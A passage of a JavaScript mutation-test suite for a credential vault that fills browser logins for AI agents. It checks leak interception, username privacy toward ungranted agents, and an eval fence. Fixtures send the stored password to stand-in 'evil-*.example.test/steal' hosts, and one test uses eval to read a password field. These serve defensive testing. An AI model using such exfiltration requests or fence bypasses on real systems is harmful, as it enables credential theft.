  const BL_M18 = m18BlSrc !== blSrc ? MUT.load('src/browser-login.js', m18BlSrc, 'm7-ambiguous-leaks-users') : null;

  {
    const dirM10 = scratch('vl-r24-m10-15');
    fs.rmSync(dirM10, { recursive: true, force: true });
    fs.mkdirSync(dirM10, { recursive: true });
    const fkR24 = await startFakeKernel({ firstUrl: 'https://shop.example.test/login', mode: { standard: true } });
    const engR24 = VE.create({ dataDir: dirM10, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
    await engR24.setup('MutR24#Pass9');
    try {
      const gR24 = GS.create({ memory: true });
      const logR24 = Lm.create({ vault: engR24, grants: () => gR24, log: () => {} });
      const PW_M = 'MutR24Secret!' + crypto.randomBytes(4).toString('hex');
      logR24.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_M }, { who: 'owner' });
      logR24.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-mr24');
      let holdersM = [{ browserKey: 'bk-mr24', sessionId: 's-mr24' }];
      const skR24 = {
        cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
        onLease: () => () => {},
        saveLoginFenceState() {},
        loginFenceStateOf: () => null,
        loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), action }),
      };
      const tidR24 = fkR24.targets()[0].targetId;

      // Judge M10 (N1 hold relaxes wantCred)
      if (BD_M10) {
        fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }, { id: 'big', tag: 'textarea', type: 'textarea', name: 'Big', value: 'x'.repeat(2400) }] });
        const w10 = BD_M10.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24, wipeMaxScanPositions: 256 });
        await w10.arm('bp-m10');
        w10.noteActiveTab({ profileId: 'bp-m10', browserKey: 'bk-mr24' }, tidR24);
        await w10.fillVaultField({ profileId: 'bp-m10', browserKey: 'bk-mr24' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
        await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
        await new Promise((r) => setTimeout(r, 40));
        const leak10 = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m10.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
        ok(leak10.action === 'unwatched', 'MUTANT 10 RED (N1 hold-relaxes-fetch): relaxing wantCred on holdReason lets foreign Fetch bypass interception', leak10);
        w10.shutdown();
      } else ok(false, 'MUTANT 10 RED (N1a): anchor not found');

      // Judge M11 (N1 toPerson bypasses syncTabFetchMode)
      if (BD_M11) {
        holdersM = [{ browserKey: 'bk-mr24', sessionId: 's-mr24' }];
        fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
        const w11 = BD_M11.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => holdersM.filter((h) => !h.human).length, logins: logR24 });
        await w11.arm('bp-m11');
        w11.noteActiveTab({ profileId: 'bp-m11', browserKey: 'bk-mr24' }, tidR24);
        await w11.fillVaultField({ profileId: 'bp-m11', browserKey: 'bk-mr24' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
        holdersM = [{ browserKey: 'bk-h', human: true, input: 'user' }];
        await w11.arm('bp-m11');
        await new Promise((r) => setTimeout(r, 25));
        holdersM = [{ browserKey: 'bk-mr24', sessionId: 's-mr24' }];
        await w11.arm('bp-m11');
        await new Promise((r) => setTimeout(r, 25));
        const leak11 = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m11.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
        ok(leak11.action === 'unwatched', 'MUTANT 11 RED (N1 toPerson-bypasses-sync): stale fetchMode after agent->person->agent leaves foreign Fetch unwatched', leak11);
        w11.shutdown();
      } else ok(false, 'MUTANT 11 RED (N1b): anchor not found');

      // Judge M12 (N2 getFullAXTree over watch socket on 3,000-row page)
      if (BD_M12) {
        const bigEls = Array.from({ length: 3000 }, (_, i) => ({ id: `r${i}`, tag: 'input', type: 'text', name: `row ${i}` }));
        fkR24.setDom(tidR24, { url: 'https://shop.example.test/big', elements: bigEls, axPadBytes: 6000 });
        const evs12 = [];
        const w12 = BD_M12.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
        w12.onChange((ev) => evs12.push(ev));
        await w12.arm('bp-m12');
        const m0 = fkR24.mark();
        await w12.noteSnapshot({ profileId: 'bp-m12', browserKey: 'bk-mr24' }, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: 'row 0', nth: 0 }], targetId: tidR24 });
        await new Promise((r) => setTimeout(r, 30));
        const ax12 = fkR24.calls().filter((c) => c.seq > m0 && c.method === 'Accessibility.getFullAXTree').length;
        const down12 = evs12.some((x) => x.kind === 'down');
        ok(ax12 >= 1 && down12 === true, 'MUTANT 12 RED (N2 snapshot-full-ax-on-watch): getFullAXTree on snapshot calls Accessibility.* and drops watch (1009) on 3,000-row page', { ax12, down12 });
        w12.shutdown();
      } else ok(false, 'MUTANT 12 RED (N2): anchor not found');

      // Judge M13 (N4 json scan cap fails open)
      if (BD_M13) {
        const bigJson = JSON.stringify(Array.from({ length: Dm.SCAN_LIMITS.maxJsonNodes + 5 }, () => 0));
        const realIr = Dm.inspectRequestBody(bigJson, [Dm.credSigOf(PW_M)], 'application/json', { hasPostData: true });
        const mutIr = BD_M13.inspectRequestBody(bigJson, [BD_M13.credSigOf(PW_M)], 'application/json', { hasPostData: true });
        ok(realIr.undecodable === true && mutIr.undecodable === false,
          'MUTANT 13 RED (N4 json-cap-fails-open): real fails closed at >4096 JSON nodes; mutant answers undecodable:false and lets foreign body pass',
          { realIr, mutIr });
      } else ok(false, 'MUTANT 13 RED (N4): anchor not found');

      // Judge M14 (m2 Network.disable omitted)
      if (BD_M14) {
        fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
        const w14 = BD_M14.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
        await w14.arm('bp-m14');
        w14.noteActiveTab({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, tidR24);
        await w14.fillVaultField({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
        const m0 = fkR24.mark();
        await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
        for (let i = 0; i < 40; i++) {
          if (w14.liveFillVerdictFor({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { verb: 'eval', argv: ['eval', '1'] }).ok) break;
          await new Promise((r) => setTimeout(r, 10));
        }
        const netDis14 = fkR24.calls().filter((c) => c.seq > m0 && c.method === 'Network.disable').length;
        ok(netDis14 === 0, 'MUTANT 14 RED (m2 network-never-disabled): without Network.disable on fence lift, Network domain stays enabled forever', { netDis14 });
        w14.shutdown();
      } else ok(false, 'MUTANT 14 RED (m2): anchor not found');

      // Judge M15 (N5 post-prepare typing guard removed)
      if (LF_M15) {
        fkR24.mode.preInsertDelayMs = 25;
        fkR24.setDom(tidR24, {
          url: 'https://shop.example.test/login',
          elements: [
            { id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' },
            { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'strip-inert' },
          ],
        });
        const WebSocket = require(path.join(REPO, 'node_modules/ws'));
        const ws15 = new WebSocket(fkR24.wsUrl);
        await new Promise((r) => ws15.once('open', r));
        let seq15 = 0;
        const pend15 = new Map();
        ws15.on('message', (raw) => { const m = JSON.parse(String(raw)); if (m.id && pend15.has(m.id)) { const fn = pend15.get(m.id); pend15.delete(m.id); fn(m); } });
        const send15 = (method, params = {}, sid = undefined) => new Promise((r) => { const id = ++seq15; pend15.set(id, r); ws15.send(JSON.stringify({ id, method, params, ...(sid ? { sessionId: sid } : {}) })); });
        const att15 = await send15('Target.attachToTarget', { targetId: tidR24, flatten: true });
        const sid15 = att15.result.sessionId;
        await LF_M15.fillVaultElement({
          call: (m, p) => send15(m, p, sid15), browserCall: (m, p) => send15(m, p),
          targetId: tidR24, trackedUrl: 'https://shop.example.test/login',
          origin: 'https://shop.example.test', target: '#trap', slot: 'current', value: PW_M, secret: true,
        });
        const counts15 = fkR24.readDomInputCounts(tidR24);
        ws15.close();
        fkR24.mode.preInsertDelayMs = 0;
        ok((counts15.decoy?.inputEvents || 0) >= 1, 'MUTANT 15 RED (N5 typing-guard-removed): without inert + capture focus/blur guards, Input.insertText lands in post-prepare macrotask decoy', counts15);
      } else ok(false, 'MUTANT 15 RED (N5): anchor not found');

      // Judge M16 (m3 unpaired verbEnded on fill --vault /audit)
      if (RB_M16 && typeof RB_M16.setup === 'function') {
        const express = require(path.join(REPO, 'node_modules/express'));
        const prof16 = { id: 'bp-000016bb', label: 'M16' };
        const k16 = {
          clock: () => Date.now(),
          profileByRef: (r) => (r === 'bp-000016bb' || r === 'shop' ? prof16 : null),
          profile: (id) => (id === 'bp-000016bb' ? prof16 : null),
          setFor: () => ({ attachments: [{ profileId: 'bp-000016bb', alias: 'shop', label: 'M16', isDefault: true }], handles: ['shop'] }),
          resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: 'bp-000016bb', alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
          attach: async () => ({ profile: prof16, browser: { state: 'ready' }, lease: { profileId: 'bp-000016bb', browserKey: 'bk-000016aa', sessionId: 's-m16', since: 1 }, env: [], pinTab: false, others: 0 }),
          cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
          socketRootOf: () => ({ socketDir: path.join(dirM10, 'ab'), runtimeDir: dirM10 }),
          configFileFor: () => null,
          audit() {},
          noteLeaseUrl() {},
          tell() {},
          leasesFor: () => [{ profileId: 'bp-000016bb', browserKey: 'bk-000016aa', sessionId: 's-m16' }],
          statusFor: () => ({ ephemeral: null, leases: [{ profileId: 'bp-000016bb', browserKey: 'bk-000016aa', sessionId: 's-m16' }] }),
          inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
          ephemeralFor: () => null,
          onLease: () => () => {},
          saveLoginFenceState() {},
          loginFenceStateOf: () => null,
          loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M16', action }),
        };
        const w16 = Dm.create({ keeper: k16, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-000016aa', sessionId: 's-m16' }], leaseCountOf: () => 1, logins: logR24 });
        const tok16 = 'vsst_' + crypto.randomBytes(12).toString('hex');
        const sess16 = { agentToken: tok16, _browserKey: 'bk-000016aa', _browserVariant: 'D', name: 'M16 Agent', cwd: dirM10, backendSessionId: 'conv-mr24' };
        RB_M16.setup({ keeper: k16, activeSessions: new Map([['s-m16', sess16]]), dialogs: w16, logins: logR24, tasksForSession: () => [] });
        const app16 = express();
        app16.use(express.json());
        app16.use(RB_M16.router);
        const srv16 = await new Promise((r) => { const s = app16.listen(0, '127.0.0.1', () => r(s)); });
        try {
          const port16 = srv16.address().port;
          const post16 = async (u, body) => {
            const resp = await fetch(`http://127.0.0.1:${port16}${u}`, {
              method: 'POST',
              headers: { 'content-type': 'application/json', authorization: `Bearer ${tok16}` },
              body: JSON.stringify(body),
            });
            return resp.json();
          };
          const rW = await post16('/api/agent/browser/resolve', { handle: 'shop', argv: ['wait', '5000'], wrapper: true });
          const runningBefore = w16.verbRunning('bk-000016aa');
          const pF = await post16('/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#pw', spec: 'shop.example.test#alice/password' });
          const rF = await post16('/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#pw', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: pF.fillTicket });
          await post16('/api/agent/browser/audit', { profile: 'bp-000016bb', verb: 'fill', ok: true, since: rF.at || 1 });
          const runningAfter = w16.verbRunning('bk-000016aa');
          void rW;
          ok(runningBefore === true && runningAfter === false,
            'MUTANT 16 RED (m3 unpaired-verb-ended): without started:true on vaultFill /resolve, /audit prematurely drops parallel verbRunning() to false',
            { runningBefore, runningAfter });
        } finally {
          srv16.close();
          w16.shutdown();
        }
      } else ok(false, 'MUTANT 16 RED (m3): anchor not found');

      // Judge M17 (m6 addOwn dangling totpName)
      if (LG_M17) {
        const logM17 = LG_M17.create({ vault: engR24, grants: () => gR24, log: () => {} });
        const mutAdd17 = logM17.addOwn({ origin: 'https://shop.example.test', username: 'dangling2fa', password: PW_M, totpName: 'ghost-totp' }, { who: 'owner' });
        ok(mutAdd17.ok === true, 'MUTANT 17 RED (m6 dangling-totp-allowed): without Vault existence check, addOwn seals dangling totpName', mutAdd17);
      } else ok(false, 'MUTANT 17 RED (m6): anchor not found');

      // Judge M18 (m7 login_ambiguous leaks usernames before grant check) + r25 refused-fill `usesOf` privacy + Mutant 23 RED!
      if (BL_M18) {
        const ent18 = [
          { name: 'web-login:https://shop.example.test#secret_user_a', origin: 'https://shop.example.test', user: 'secret_user_a', owner: null },
          { name: 'web-login:https://shop.example.test#secret_user_b', origin: 'https://shop.example.test', user: 'secret_user_b', owner: null },
        ];
        const sp18 = BL_M18.parseVaultFillSpec('shop.example.test/password');
        const real18 = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: sp18, entries: ent18, grantRows: () => [], facts: { conversationKeys: ['ungranted'] }, vaultState: 'unlocked' });
        const mut18 = BL_M18.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: sp18, entries: ent18, grantRows: () => [], facts: { conversationKeys: ['ungranted'] }, vaultState: 'unlocked' });
        ok(real18.code === 'login_not_granted' && !real18.error.includes('secret_user_a')
          && mut18.code === 'login_ambiguous' && mut18.error.includes('secret_user_a'),
          'MUTANT 18 RED (m7 ambiguous-leaks-users): checking ambiguity before grant discloses usernames to ungranted agent',
          { realCode: real18.code, mutCode: mut18.code });
      } else ok(false, 'MUTANT 18 RED (m7): anchor not found');

      {
        logR24.addOwn({ origin: 'https://shop.example.test', username: 'secret_bob', password: PW_M }, { who: 'owner' });
        const rfSite = logR24.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test/password', conv: 'conv-ungranted', actor: 'Ungranted', facts: { conversationKeys: ['conv-ungranted'] } });
        const rfNamed = logR24.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#secret_bob/password', conv: 'conv-ungranted', actor: 'Ungranted', facts: { conversationKeys: ['conv-ungranted'] } });
        const rfNew = logR24.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'new:shop.example.test#secret_eve/password', generate: true, conv: 'conv-ungranted', actor: 'Ungranted', facts: { conversationKeys: ['conv-ungranted'] } });
        const usesUngranted = engR24.usesOf('conv-ungranted');
        const usesJson = JSON.stringify(usesUngranted);
        ok(!rfSite.ok && rfSite.code === 'login_not_granted' && !rfSite.error.includes('alice') && !rfSite.error.includes('secret_bob')
          && !rfNamed.ok && rfNamed.code === 'login_not_granted' && rfNamed.name === undefined
          && !rfNew.ok && rfNew.code === 'login_not_granted' && rfNew.name === undefined
          && Array.isArray(usesUngranted) && usesUngranted.length === 3
          && usesUngranted.every((u) => u.entry === 'web-login:https://shop.example.test' && u.outcome === 'not_granted')
          && !usesJson.includes('alice') && !usesJson.includes('secret_bob') && !usesJson.includes('secret_eve') && !usesJson.includes('#'),
          'r25 (refused-fill uses privacy): refused ungranted fills (site-level, #user, and new:#user) record web-login:<origin> in vault-audit.jsonl and NEVER expose #<user> in usesOf(conv)',
          { rfSite, rfNamed, rfNew, usesUngranted });

        // Mutant 23 (r25): record `web-login:<origin>#<user>` on `login_not_granted` -> `usesOf(conv)` leaks `#<user>` back to ungranted caller!
        const m23LgSrc = lgSrc.replace(
          'use(`${BL.PREFIX}${siteOrigin}`, { conv, actor, outcome: \'not_granted\', purpose: purposeOf(parsed.field, siteOrigin, profileId) });',
          'use(`${BL.PREFIX}${siteOrigin}#${parsed.user || (allEntries[0] && allEntries[0].user) || \'leaked\'}`, { conv, actor, outcome: \'not_granted\', purpose: purposeOf(parsed.field, siteOrigin, profileId) });',
        );
        const LG_M23 = m23LgSrc !== lgSrc ? MUT.load('src/server/browser-logins.js', m23LgSrc, 'r25-refused-fill-uses-leaks-user') : null;
        if (LG_M23) {
          const logM23 = LG_M23.create({ vault: engR24, grants: () => gR24, log: () => {} });
          logM23.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test/password', conv: 'conv-mut23', actor: 'Mut23', facts: { conversationKeys: ['conv-mut23'] } });
          const mutUses23 = engR24.usesOf('conv-mut23');
          ok(Array.isArray(mutUses23) && mutUses23.some((u) => /#alice/.test(String(u.entry || ''))),
            'MUTANT 23 RED (r25 refused-fill-uses-leaks-user): recording web-login:<origin>#<user> on refused fill leaks #<user> through vibespace-vault uses',
            mutUses23);
        } else ok(false, 'MUTANT 23 RED (r25): anchor not found');
      }

      // ── r25 DEDICATED PINS & RED MUTANTS (A1, A2, A3, A4, A5) ──
      // A4: `.388` (`master`) `recordOf` rollback oracle + `schema: 1|2` + `0` `secretPut` on legacy fill
      {
        const master388RecordOf = (text) => {
          let r; try { r = typeof text === 'string' ? JSON.parse(text) : text; } catch { return null; }
          if (!r || typeof r !== 'object' || r.v !== 1) return null;
          const origin = BL.originOf(r.origin);
          if (!origin || origin !== r.origin || typeof r.username !== 'string' || !r.username || r.username.length > 256 || typeof r.password !== 'string' || !r.password || r.password.length > 4096) return null;
          const out = { v: 1, origin, username: r.username, password: r.password };
          if (typeof r.totpName === 'string' && /^[\w.-]{1,120}$/.test(r.totpName)) out.totpName = r.totpName;
          if (r.previous && typeof r.previous === 'object' && typeof r.previous.password === 'string' && r.previous.password) out.previous = { password: r.previous.password };
          return out;
        };

        const rOwn = BL.newRecord({ origin: 'https://shop.example.test', username: 'rb_own', password: 'Own#Password1', totpName: 'shop-2fa', source: 'owner', now: 100 });
        const rReg = BL.newRecord({ origin: 'https://shop.example.test', username: 'rb_reg', password: 'Reg#Password2', source: 'vault-minted', pending: 'register', now: 101 });
        const rChg = BL.mintChangeRecord(rOwn, 'Chg#Password3', { now: 102 }).record;
        const rCfm = BL.confirmPendingRecord(rChg, { now: 103 }).record;

        const mOwn = master388RecordOf(BL.textOf(rOwn));
        const mReg = master388RecordOf(BL.textOf(rReg));
        const mChg = master388RecordOf(BL.textOf(rChg));
        const mCfm = master388RecordOf(BL.textOf(rCfm));
        const rawOwnJson = JSON.parse(BL.textOf(rOwn));
        ok(rawOwnJson.v === 1 && rawOwnJson.schema === 2
          && mOwn?.password === 'Own#Password1' && mOwn?.totpName === 'shop-2fa'
          && mReg?.password === 'Reg#Password2'
          && mChg?.password === 'Own#Password1' && mChg?.totpName === 'shop-2fa'
          && mCfm?.password === 'Chg#Password3' && mCfm?.previous?.password === 'Own#Password1',
          'A4 (rollback): all 4 tip-written record states (addOwn, register, change, confirm) carry v:1, schema:2 and read back in .388 recordOf with active password, totpName, and previous',
          { mOwn, mReg, mChg, mCfm });

        // Legacy `.388` (`schema: 1`) record filled on tip -> 0 `secretPut` calls and remains readable by `.388` `recordOf`!
        const legacyName = BL.entryName('https://legacy388.example.test', 'olduser');
        const legacyJson = JSON.stringify({
          v: 1, origin: 'https://legacy388.example.test', username: 'olduser', password: 'Legacy388!Password9',
          createdAt: 50, by: 'owner', source: 'owner', strength: 'unknown', submittedAt: 50, lastUsedAt: null, totpName: 'legacy-2fa',
        });
        const parsedLegacy = BL.recordOf(legacyJson);
        engR24.secretPut(legacyName, legacyJson, { kind: 'owner' });
        logR24.grant(legacyName, 'this-account', 'session:conv-mr24');
        let secretPutCountOnFill = 0;
        const origPut = engR24.secretPut.bind(engR24);
        engR24.secretPut = (...a) => { secretPutCountOnFill++; return origPut(...a); };
        let fillLegacy;
        try {
          logR24.names();
          fillLegacy = logR24.resolveFill({
            tabOrigin: 'https://legacy388.example.test',
            spec: 'legacy388.example.test#olduser/password',
            facts: { conversationKeys: ['conv-mr24'] },
            checkOnly: false,
          });
          fillLegacy?.noteFillUse?.();
        } finally {
          engR24.secretPut = origPut;
        }
        const storedAfterFill = engR24.secretGet(legacyName).value.toString('utf8');
        const masterReadsAfterFill = master388RecordOf(storedAfterFill);
        ok(parsedLegacy?.schema === 2 && JSON.stringify(BL.recordOf(parsedLegacy)) === JSON.stringify(parsedLegacy)
          && fillLegacy?.ok === true && fillLegacy.value === 'Legacy388!Password9'
          && secretPutCountOnFill === 0 && masterReadsAfterFill?.password === 'Legacy388!Password9' && masterReadsAfterFill?.totpName === 'legacy-2fa',
          'A4 (legacy read): filling and listing a .388 v:1 record normalizes idempotently in memory (schema:2), performs 0 secretPut writes, and leaves .388 rollback bytes intact',
          { schema: parsedLegacy?.schema, secretPutCountOnFill, masterReadsAfterFill });

        // Mutant 22 (A4): omit top-level `password` mirror in `textOf` -> `.388` `recordOf` returns null on rollback!
        const m22BlSrc = blSrc.replace(
          'return JSON.stringify({ ...r, schema: 2, password: compatPw });',
          'return JSON.stringify({ ...r, schema: 2 });',
        );
        const BL_M22 = m22BlSrc !== blSrc ? MUT.load('src/browser-login.js', m22BlSrc, 'a4-rollback-password-omitted') : null;
        if (BL_M22) {
          const mutDrop = master388RecordOf(BL_M22.textOf(rOwn));
          ok(mOwn !== null && mutDrop === null,
            'MUTANT 22 RED (A4 rollback-password-omitted): omitting top-level password mirror breaks .388 recordOf rollback (returns null)',
            { realOk: Boolean(mOwn), mutDrop });
        } else ok(false, 'MUTANT 22 RED (A4): anchor not found');
      }

      // Mutant 20 (A2): restore `req.body?.vaultFill === true` skipping `liveFillRefusal` in `src/routes/browser.js` -> `eval` with `vaultFill: true` returns 200!
      {
        const m20RbSrc = rbSrc.replace(
          '    if (await liveFillRefusal(res, k, f, r.profile && r.profile.id, req, verb)) return;',
          '    if (req.body?.vaultFill !== true && await liveFillRefusal(res, k, f, r.profile && r.profile.id, req, verb)) return;',
        );
        const RB_M20 = m20RbSrc !== rbSrc ? MUT.load('src/routes/browser.js', m20RbSrc, 'a2-body-vaultfill-bypasses-fence') : null;
        if (RB_M20 && typeof RB_M20.setup === 'function') {
          const express = require(path.join(REPO, 'node_modules/express'));
          const prof20 = { id: 'bp-000020bb', label: 'M20' };
          fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
          const w20 = Dm.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-000020aa', sessionId: 's-m20' }], leaseCountOf: () => 1, logins: logR24 });
          await w20.arm('bp-000020bb');
          w20.noteActiveTab({ profileId: 'bp-000020bb', browserKey: 'bk-000020aa' }, tidR24);
          await w20.fillVaultField({ profileId: 'bp-000020bb', browserKey: 'bk-000020aa' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
          const k20 = {
            clock: () => Date.now(),
            profileByRef: (r) => (r === 'bp-000020bb' || r === 'shop' ? prof20 : null),
            profile: (id) => (id === 'bp-000020bb' ? prof20 : null),
            setFor: () => ({ attachments: [{ profileId: 'bp-000020bb', alias: 'shop', label: 'M20', isDefault: true }], handles: ['shop'] }),
            resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: 'bp-000020bb', alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
            attach: async () => ({ profile: prof20, browser: { state: 'ready' }, lease: { profileId: 'bp-000020bb', browserKey: 'bk-000020aa', sessionId: 's-m20', since: 1 }, cdpUrl: fkR24.wsUrl, env: [], pinTab: false, others: 0 }),
            cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
            socketRootOf: () => ({ socketDir: path.join(dirM10, 'ab20'), runtimeDir: dirM10 }),
            configFileFor: () => null,
            audit() {},
            noteLeaseUrl() {},
            tell() {},
            leasesFor: () => [{ profileId: 'bp-000020bb', browserKey: 'bk-000020aa', sessionId: 's-m20' }],
            statusFor: () => ({ ephemeral: null, leases: [{ profileId: 'bp-000020bb', browserKey: 'bk-000020aa', sessionId: 's-m20' }] }),
            inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
            ephemeralFor: () => null,
            onLease: () => () => {},
            saveLoginFenceState() {},
            loginFenceStateOf: () => null,
            loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M20', action }),
          };
          const tok20 = 'vsst_' + crypto.randomBytes(12).toString('hex');
          const sess20 = { agentToken: tok20, _browserKey: 'bk-000020aa', _browserVariant: 'D', name: 'M20 Agent', cwd: dirM10, backendSessionId: 'conv-mr24' };
          RB_M20.setup({ keeper: k20, activeSessions: new Map([['s-m20', sess20]]), dialogs: w20, logins: logR24, tasksForSession: () => [] });
          const app20 = express();
          app20.use(express.json());
          app20.use(RB_M20.router);
          const srv20 = await new Promise((r) => { const s = app20.listen(0, '127.0.0.1', () => r(s)); });
          try {
            const resp = await fetch(`http://127.0.0.1:${srv20.address().port}/api/agent/browser/resolve`, {
              method: 'POST',
              headers: { 'content-type': 'application/json', authorization: `Bearer ${tok20}` },
              body: JSON.stringify({ handle: 'shop', argv: ['eval', 'document.querySelector("#pw").value'], wrapper: true, vaultFill: true }),
            });
            ok(resp.status === 200,
              'MUTANT 20 RED (A2 body-vaultfill-bypasses-fence): trusting req.body.vaultFill===true lets eval bypass liveFillRefusal with HTTP 200',
              { status: resp.status });
          } finally {
            srv20.close();
            w20.shutdown();
            LF.clearAllFilledSecrets();
          }
        } else ok(false, 'MUTANT 20 RED (A2): anchor not found');
      }

      // A3: Hub `noteSnapshot` 2048-char name cap + 3 short-socket failure modes (`ECONNREFUSED`, `attach` error, non-upgrading TCP peer with 0 lingering sockets) + `ax_nodes_exceeded` + Mutant 21 RED!
      {
        const net = require('node:net');
        const { WebSocketServer, WebSocket } = require(path.join(REPO, 'node_modules/ws'));

        // 1. Hub `noteSnapshot` enforces `2048`-char name cap and `128`-char role cap on its own (independent of CLI)
        let capturedQuery = null;
        const capWss = new WebSocketServer({ port: 0, host: '127.0.0.1' });
        await new Promise((r) => capWss.once('listening', r));
        const capPort = capWss.address().port;
        capWss.on('connection', (sock) => {
          sock.on('message', (raw) => {
            const m = JSON.parse(String(raw));
            if (m.method === 'Target.attachToTarget') sock.send(JSON.stringify({ id: m.id, result: { sessionId: 's-cap' } }));
            else if (m.method === 'Page.createIsolatedWorld') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { executionContextId: 1 } }));
            else if (m.method === 'Runtime.evaluate') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { result: { objectId: 'obj-1' } } }));
            else if (m.method === 'Accessibility.queryAXTree') {
              if (!capturedQuery) capturedQuery = m.params;
              sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { nodes: [] } }));
            } else sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: {} }));
          });
        });
        try {
          const wCap = Dm.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
          await wCap.arm('bp-cap');
          const overLongName = 'N'.repeat(10_000);
          const overLongRole = 'textbox' + 'R'.repeat(400);
          const snapCapRes = await wCap.noteSnapshot(
            { profileId: 'bp-cap', browserKey: 'bk-mr24' },
            { parsedRefs: [{ ref: '@e1', role: overLongRole, name: overLongName, nth: 0 }], targetId: tidR24 },
          );
          fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
          // Inspect what `noteSnapshot` stored by resolving `@e1` through a short server if we check `snapCapRes`:
          // even simpler, run `fillVaultField` on a custom keeper pointing at `capWss` — or check `capturedQuery`!
          wCap.shutdown();
          const kCap = { ...skR24, cdpEndpointFor: async () => ({ ok: true, url: `ws://127.0.0.1:${capPort}` }) };
          const wCap2 = Dm.create({ keeper: kCap, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
          // `capWss` also needs `Target.getTargets` and `openIsolatedOrigin` to reach `resolveSnapshotRef`:
          capWss.removeAllListeners('connection');
          capWss.on('connection', (sock) => {
            sock.on('message', (raw) => {
              const m = JSON.parse(String(raw));
              if (m.method === 'Browser.getVersion') sock.send(JSON.stringify({ id: m.id, result: { product: 'Chrome/154', userAgent: 'HeadlessChrome/154' } }));
              else if (m.method === 'Target.getTargets') sock.send(JSON.stringify({ id: m.id, result: { targetInfos: [{ targetId: 'T-CAP', type: 'page', url: 'https://shop.example.test/login', title: 'Cap' }] } }));
              else if (m.method === 'Target.getTargetInfo') sock.send(JSON.stringify({ id: m.id, sessionId: m.sessionId, result: { targetInfo: { targetId: 'T-CAP', type: 'page', url: 'https://shop.example.test/login' } } }));
